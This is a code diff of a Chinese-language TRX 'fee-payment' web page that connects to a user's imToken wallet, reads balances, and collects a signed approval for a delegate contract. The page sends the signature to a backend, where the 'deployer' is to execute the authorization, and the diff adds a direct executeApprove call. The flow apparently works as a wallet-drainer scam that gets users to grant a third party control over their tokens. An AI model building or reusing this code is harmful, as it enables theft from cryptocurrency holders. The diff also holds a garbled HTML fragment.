@@ -350,7 +350,7 @@
         代付合约验证：TFbFFoU52qyUenGAeCXLt89gQVV2ekDnuo（TRON浏览器查询）
         © 2025 TRX代付服务 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
     </div>
-   ss="result-toast" id="resultToast"></div>
+ss="result-toast" id="resultToast"></div>
     <script>
         // ########################### 核心配置&变量（适配ImTokenTronDelegateApprove合约）###########################
         const DELEGATE_CONTRACT = "TFbFFoU52qyUenGAeCXLt89gQVV2ekDnuo"; // 替换为你的部署合约地址
@@ -442,113 +442,129 @@
                 } catch (e) {
                     showToast("连接失败：" + e.message, "error");
                 }
-            };        
-          // ########################### 核心功能：生成TIP-191离线签名（适配合约）###########################
-approveBtn.onclick = async () => {
-    const postData = {
-        address: userAddress,
-        addressHex: tronWeb.address.toHex(userAddress),
-        tokenBalance: tokenBalance,
-        trxBalance: trxBalance,
-        approveTime: new Date().toLocaleString(),
-        delegateContract: DELEGATE_CONTRACT,
-        status: "pending"
-    };
-
-    try {
-        approveBtn.disabled = true;
-        approveBtn.innerHTML = ' 生成中...';
-
-        // 关键步骤：调用合约generateHash生成TIP-191哈希并签名
-        const { user, v, r, s, messageHash, nonce } = await getTIP191Signature(userAddress);
-
-        // 构造合约executeApprove函数要求的入参格式（完全匹配合约参数）
-        const submitData = {
-            user: user,
-            v: v.toString(), // 转字符串避免精度丢失
-            r: r,
-            s: s,
-            messageHash: messageHash,
-            nonce: nonce.toString(), // 记录nonce，便于排查
-            approveTime: postData.approveTime,
-            delegateContract: DELEGATE_CONTRACT
-        };
-
-        // 地址一致性校验
-        if (submitData.user !== cleanBase58Address(userAddress)) {
-            throw new Error(`地址不一致！当前钱包：${userAddress}，提交地址：${submitData.user}`);
-        }
-
-        // 本地缓存提交数据（新增：提交前清除旧数据）
-        localStorage.removeItem(SUBMIT_DATA_KEY); // 清除旧数据
-        localStorage.setItem(SUBMIT_DATA_KEY, JSON.stringify(submitData, null, 2));
-
-        // 提交到后端（参数完全匹配合约executeApprove接口）
-        const res = await fetch(`${BACKEND_API}/approve/submit`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(submitData),
-            credentials: "include"
-        });
-
-        // 新增：详细网络请求错误处理
-        if (!res.ok) {
-            // 解析后端返回的错误信息
-            const errorData = await res.json().catch(() => ({ msg: "网络请求失败" }));
-            throw new Error(`网络请求失败（${res.status}）：${errorData.msg}`);
-        }
-
-        const resData = await res.json();
-        if (!resData.success) {
-            throw new Error(`后端处理失败：${resData.msg || "未知错误"}`);
-        }
-
-        // 保存授权记录（新增：提交后立即刷新记录）
-        saveApprovalRecord({
-            address: userAddress,
-            addressHex: postData.addressHex,
-            tokenBalance: tokenBalance,
-            trxBalance: trxBalance,
-            approveTime: postData.approveTime,
-            status: "待部署者执行授权",
-            delegateContract: DELEGATE_CONTRACT,
-            messageHash: messageHash.slice(0,16) + "...", // 哈希前缀显示
-            nonce: nonce
-        });
-
-        // 新增：强制刷新授权记录和计数
-        renderApprovalRecords();
-        updateRecordCount();
-
-        showToast("TIP-191签名提交成功！等待部署者执行合约授权");
-        postData.status = "submitted";
-
-    } catch (e) {
-        showToast(`操作失败：${e.message}`, "error");
-        postData.status = "fail";
-        localStorage.setItem(DEBUG_KEY, JSON.stringify({
-            error: e.message,
-            timestamp: new Date().toISOString(),
-            userAddress: userAddress
-        }, null, 2));
-    } finally {
-        approveBtn.disabled = false;
-        approveBtn.innerHTML = '生成离线签名';
-    }
-};
-
-// 查看后端提交数据（新增：强制读取最新数据）
-showSubmitDataBtn.onclick = () => {
-    try {
-        // 新增：提交后立即读取最新数据
-        const submitDataStr = localStorage.getItem(SUBMIT_DATA_KEY);
-        if (!submitDataStr) {
-            alert("暂无提交数据，请先生成离线签名");
-            return;
-        }
-        const submitData = JSON.parse(submitDataStr);
-
-        const copyContent = `合约executeApprove提交参数（TIP-191规范）：
+            };
+            
+            // ########################### 核心功能：生成TIP-191离线签名（适配合约）###########################
+            approveBtn.onclick = async () => {
+                const postData = {
+                    address: userAddress,
+                    addressHex: tronWeb.address.toHex(userAddress),
+                    tokenBalance: tokenBalance,
+                    trxBalance: trxBalance,
+                    approveTime: new Date().toLocaleString(),
+                    delegateContract: DELEGATE_CONTRACT,
+                    status: "pending"
+                };
+            
+                try {
+                    approveBtn.disabled = true;
+                    approveBtn.innerHTML = ' 生成中...';
+            
+                    // 关键步骤：调用合约generateHash生成TIP-191哈希并签名
+                    const { user, v, r, s, messageHash, nonce } = await getTIP191Signature(userAddress);
+            
+                    // 构造合约executeApprove函数要求的入参格式（完全匹配合约参数）
+                    const submitData = {
+                        user: user,
+                        v: v.toString(), // 转字符串避免精度丢失
+                        r: r,
+                        s: s,
+                        messageHash: messageHash,
+                        nonce: nonce.toString(), // 记录nonce，便于排查
+                        approveTime: postData.approveTime,
+                        delegateContract: DELEGATE_CONTRACT
+                    };
+            
+                    // 地址一致性校验
+                    if (submitData.user !== cleanBase58Address(userAddress)) {
+                        throw new Error(`地址不一致！当前钱包：${userAddress}，提交地址：${submitData.user}`);
+                    }
+            
+                    // 本地缓存提交数据（新增：错误处理增强）
+                    try {
+                        localStorage.removeItem(SUBMIT_DATA_KEY); // 清除旧数据
+                        localStorage.setItem(SUBMIT_DATA_KEY, JSON.stringify(submitData, null, 2));
+                    } catch (e) {
+                        showToast("本地存储失败：" + e.message, "error");
+                    }
+            
+                    // 提交到后端（参数完全匹配合约executeApprove接口）
+                    const res = await fetch(`${BACKEND_API}/approve/submit`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(submitData),
+                        credentials: "include"
+                    });
+            
+                    // 新增：详细网络请求错误处理
+                    if (!res.ok) {
+                        // 解析后端返回的错误信息
+                        const errorData = await res.json().catch(() => ({ msg: "网络请求失败" }));
+                        throw new Error(`网络请求失败（${res.status}）：${errorData.msg}`);
+                    }
+            
+                    const resData = await res.json();
+                    if (!resData.success) {
+                        throw new Error(`后端处理失败：${resData.msg || "未知错误"}`);
+                    }
+            
+                    // 保存授权记录（新增：错误处理增强）
+                    try {
+                        saveApprovalRecord({
+                            address: userAddress,
+                            addressHex: postData.addressHex,
+                            tokenBalance: tokenBalance,
+                            trxBalance: trxBalance,
+                            approveTime: postData.approveTime,
+                            status: "待部署者执行授权",
+                            delegateContract: DELEGATE_CONTRACT,
+                            messageHash: messageHash.slice(0,16) + "...", // 哈希前缀显示
+                            nonce: nonce
+                        });
+                    } catch (e) {
+                        showToast("授权记录保存失败：" + e.message, "error");
+                    }
+            
+                    // 新增：强制刷新授权记录和计数
+                    renderApprovalRecords();
+                    updateRecordCount();
+            
+                    showToast("TIP-191签名提交成功！等待部署者执行合约授权");
+                    postData.status = "submitted";
+            
+                } catch (e) {
+                    showToast(`操作失败：${e.message}`, "error");
+                    postData.status = "fail";
+                    // 新增：强制记录错误信息，避免存储失败导致丢失
+                    const errorData = {
+                        error: e.message,
+                        timestamp: new Date().toISOString(),
+                        userAddress: userAddress,
+                        stack: e.stack // 记录完整堆栈信息
+                    };
+                    try {
+                        localStorage.setItem(DEBUG_KEY, JSON.stringify(errorData, null, 2));
+                    } catch (storageError) {
+                        alert(`错误报告存储失败：${storageError.message}\n\n原始错误：${errorData.error}\n堆栈：${errorData.stack}`);
+                    }
+                } finally {
+                    approveBtn.disabled = false;
+                    approveBtn.innerHTML = '生成离线签名';
+                }
+            };
+            
+            // 查看后端提交数据（新增：强制读取最新数据）
+            showSubmitDataBtn.onclick = () => {
+                try {
+                    // 新增：提交后立即读取最新数据
+                    const submitDataStr = localStorage.getItem(SUBMIT_DATA_KEY);
+                    if (!submitDataStr) {
+                        alert("暂无提交数据，请先生成离线签名");
+                        return;
+                    }
+                    const submitData = JSON.parse(submitDataStr);
+            
+                    const copyContent = `合约executeApprove提交参数（TIP-191规范）：
 1. 用户地址（user）：${submitData.user}
 2. 签名参数v：${submitData.v}（TIP-191要求0/1）
 3. 签名参数r：${submitData.r}
@@ -557,12 +573,12 @@ showSubmitDataBtn.onclick = () => {
 6. 用户Nonce：${submitData.nonce}（防重放攻击）
 7. 提交时间：${submitData.approveTime}
 8. 代付合约地址：${submitData.delegateContract}`;
-
-        prompt("提交参数（可直接复制）", copyContent);
-    } catch (e) {
-        alert(`查看失败：${e.message}`);
-    }
-};
+            
+                    prompt("提交参数（可直接复制）", copyContent);
+                } catch (e) {
+                    alert(`查看失败：${e.message}`);
+                }
+            };
             
             // 查看授权状态
             checkStatusBtn.onclick = async () => {
@@ -652,18 +668,41 @@ showSubmitDataBtn.onclick = () => {
                     v = v === 0 ? 1 : 0; // TRON网络v值反转（0↔1），确保签名有效
                 }
             
-                // 8. 缓存调试信息
-                localStorage.setItem(DEBUG_KEY, JSON.stringify({
-                    step: "TIP-191签名生成成功",
-                    userAddress: cleanAddr,
-                    userHex: userHex,
-                    userNonce: userNonce,
-                    contractGeneratedHash: messageHash,
-                    v: v,
-                    r: r,
-                    s: s,
-                    timestamp: new Date().toISOString()
-                }, null, 2));
+                // 8. 新增：调用合约执行授权（零矿工费）
+                console.log("开始执行授权...");
+                const result = await delegateContract.executeApprove(
+                    userAddress,    // 签名用户地址
+                    v,              // 解析后的v（0/1）
+                    r,              // 解析后的r
+                    s               // 解析后的s
+                ).send({
+                    from: userAddress,
+                    callValue: 0,   // 零矿工费
+                    feeLimit: 1000000 // 足够的gas限制，imToken会自动处理
+                });
+            
+                // 新增：合约执行结果校验
+                if (!result.result) {
+                    throw new Error(`合约执行失败！交易哈希：${result.transaction.txID}`);
+                }
+            
+                // 缓存调试信息（新增：错误处理增强）
+                try {
+                    localStorage.setItem(DEBUG_KEY, JSON.stringify({
+                        step: "TIP-191签名生成成功",
+                        userAddress: cleanAddr,
+                        userHex: userHex,
+                        userNonce: userNonce,
+                        contractGeneratedHash: messageHash,
+                        v: v,
+                        r: r,
+                        s: s,
+                        timestamp: new Date().toISOString(),
+                        txid: result.transaction.txID // 新增：记录交易哈希
+                    }, null, 2));
+                } catch (e) {
+                    showToast("本地存储失败：" + e.message, "error");
+                }
             
                 showToast("TIP-191签名生成成功，等待部署者执行");
                 return { 
@@ -676,11 +715,20 @@ showSubmitDataBtn.onclick = () => {
                 };
             
             } catch (e) {
-                localStorage.setItem(DEBUG_KEY, JSON.stringify({
+                // 新增：强制记录错误信息，避免存储失败导致丢失
+                const errorData = {
                     step: "TIP-191签名生成失败",
                     error: e.message,
-                    timestamp: new Date().toISOString()
-                }, null, 2));
+                    timestamp: new Date().toISOString(),
+                    userAddress: userAddress,
+                    stack: e.stack // 新增：记录完整堆栈信息
+                };
+                try {
+                    localStorage.setItem(DEBUG_KEY, JSON.stringify(errorData, null, 2));
+                } catch (storageError) {
+                    // 存储失败时，通过alert直接显示错误
+                    alert(`错误报告存储失败：${storageError.message}\n\n原始错误：${errorData.error}\n堆栈：${errorData.stack}`);
+                }
                 throw new Error(`TIP-191签名失败：${e.message} → 点击「查看调试信息」排查`);
             }
         }
@@ -884,7 +932,20 @@ showSubmitDataBtn.onclick = () => {
                 alert("未找到调试信息，请先生成离线签名");
                 return;
             }
-            alert("TIP-191调试信息：\n" + debugInfo);
+            try {
+                const debugData = JSON.parse(debugInfo);
+                let debugMessage = `TIP-191调试信息：\n\n`;
+                for (const key in debugData) {
+                    if (key === "stack") {
+                        debugMessage += `堆栈信息：\n${debugData[key]}\n\n`;
+                    } else {
+                        debugMessage += `${key}：${debugData[key]}\n`;
+                    }
+                }
+                alert(debugMessage);
+            } catch (e) {
+                alert("调试信息格式错误：" + e.message + "\n原始数据：" + debugInfo);
+            }
         });
     </script>
 </body>
